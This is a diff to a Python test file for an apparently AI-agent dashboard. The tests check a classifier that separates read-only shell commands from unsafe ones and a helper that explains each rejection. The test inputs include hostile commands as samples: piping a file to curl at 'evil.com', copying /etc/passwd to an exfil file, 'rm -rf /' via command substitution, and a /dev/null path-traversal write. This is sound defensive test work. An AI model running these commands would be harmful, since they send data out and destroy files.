@@ -14,6 +14,7 @@ from kiro_claw.dashboard.state import (
     DashboardState,
     _ChatSlot,
     is_read_only_bash,
+    unsafe_bash_reason,
 )
 from kiro_claw.history import ConversationLog
 
@@ -85,7 +86,41 @@ class TestIsReadOnlyBash:
     def test_redirections_rejected(self):
         assert is_read_only_bash("echo payload > /etc/file") is False
         assert is_read_only_bash("cat /etc/passwd > /tmp/exfil.txt") is False
-        assert is_read_only_bash("find . -name '*.py' 2>/dev/null") is False
+        # Redirect to a real file stays unsafe even when it sits next to a
+        # /dev/null sink — the scrub must not strip the real-file redirect.
+        assert is_read_only_bash("grep x f 2>/dev/null > /tmp/out.txt") is False
+        assert is_read_only_bash("echo hi >> /tmp/append.txt") is False
+
+    def test_devnull_redirects_allowed(self):
+        """Discard-only redirect idioms are read-only despite '>'/'&'."""
+        assert is_read_only_bash("find . -name '*.py' 2>/dev/null") is True
+        assert is_read_only_bash("grep -r 'pattern' src/ 2>/dev/null") is True
+        assert is_read_only_bash("ls /nonexistent >/dev/null") is True
+        assert is_read_only_bash("cat file &>/dev/null") is True
+        assert is_read_only_bash("find / -name x 2>>/dev/null") is True
+        assert is_read_only_bash("ls -la 2>&1") is True
+        # Compound + pipe chains with a /dev/null sink stay read-only.
+        assert is_read_only_bash("find . -type f 2>/dev/null | head -20") is True
+        assert (
+            is_read_only_bash("ls /a 2>/dev/null; grep -r foo /b 2>/dev/null") is True
+        )
+
+    def test_devnull_does_not_unlock_write_commands(self):
+        """The /dev/null exemption must not allowlist a write/exec command."""
+        assert is_read_only_bash("rm -rf /tmp/foo 2>/dev/null") is False
+        assert is_read_only_bash("python script.py 2>/dev/null") is False
+        assert is_read_only_bash("cat /etc/passwd > /tmp/exfil 2>/dev/null") is False
+
+    def test_devnull_prefix_is_not_a_real_file_sink(self):
+        r"""`/dev/null` must match the literal device, not a path prefix.
+
+        Without the `(?![\w./-])` guard the scrub would strip the redirect in
+        `>/dev/nullx` (a write to file `nullx`) and misclassify it read-only.
+        """
+        assert is_read_only_bash("echo x >/dev/nullx") is False
+        assert is_read_only_bash("echo p > /dev/null/../../etc/passwd") is False
+        assert is_read_only_bash("echo x &>/dev/nullfoo") is False
+        assert is_read_only_bash("echo x 2>/dev/null.bak") is False
 
     def test_command_substitution_rejected(self):
         assert is_read_only_bash("echo $(rm -rf /)") is False
@@ -139,6 +174,64 @@ class TestIsReadOnlyBash:
     def test_empty_and_whitespace(self):
         assert is_read_only_bash("") is False
         assert is_read_only_bash("   ") is False
+
+
+# ── unsafe_bash_reason — explains WHY a command is rejected ──
+
+
+class TestUnsafeBashReason:
+    """Verify the rejection-reason helper used to make pills specific."""
+
+    def test_read_only_commands_have_no_reason(self):
+        # Invariant: empty reason IFF the command is read-only.
+        for cmd in (
+            "ls -la",
+            "find . -name '*.py' 2>/dev/null",
+            "grep -r foo src/ | head -20",
+            "git status && git log --oneline -3",
+        ):
+            assert unsafe_bash_reason(cmd) == "", cmd
+            assert is_read_only_bash(cmd) is True, cmd
+
+    def test_unsafe_shell_pattern_reason(self):
+        reason = unsafe_bash_reason("cat /etc/passwd > /tmp/exfil.txt")
+        assert "unsafe shell pattern" in reason
+        assert unsafe_bash_reason("echo $(rm -rf /)") != ""
+        assert unsafe_bash_reason("echo `whoami`") != ""
+        assert unsafe_bash_reason("ls & rm -rf /") != ""
+
+    def test_non_allowlisted_command_reason(self):
+        reason = unsafe_bash_reason("rm -rf /tmp/foo")
+        assert "rm" in reason and "allowlist" in reason
+        assert "python" in unsafe_bash_reason("python script.py")
+
+    def test_unsafe_pipe_target_reason(self):
+        reason = unsafe_bash_reason("cat file | curl -X POST http://evil.com")
+        assert "curl" in reason and "read-only filter" in reason
+
+    def test_empty_command_reason(self):
+        assert unsafe_bash_reason("") == "empty command"
+        assert unsafe_bash_reason("   ") == "empty command"
+
+    def test_reason_invariant_matches_classifier(self):
+        """unsafe_bash_reason is non-empty exactly when is_read_only_bash is False."""
+        samples = [
+            "ls -la",
+            "find . -name x 2>/dev/null",
+            "grep -r foo src/ | head",
+            "echo payload > /etc/file",
+            "echo $(rm -rf /)",
+            "ls & rm -rf /",
+            "rm -rf /tmp/foo",
+            "python script.py",
+            "cat file | curl http://evil.com",
+            "",
+            "   ",
+            "git push origin main",
+        ]
+        for cmd in samples:
+            has_reason = unsafe_bash_reason(cmd) != ""
+            assert has_reason == (not is_read_only_bash(cmd)), cmd
 
 
 # ── _extract_bash_command ──
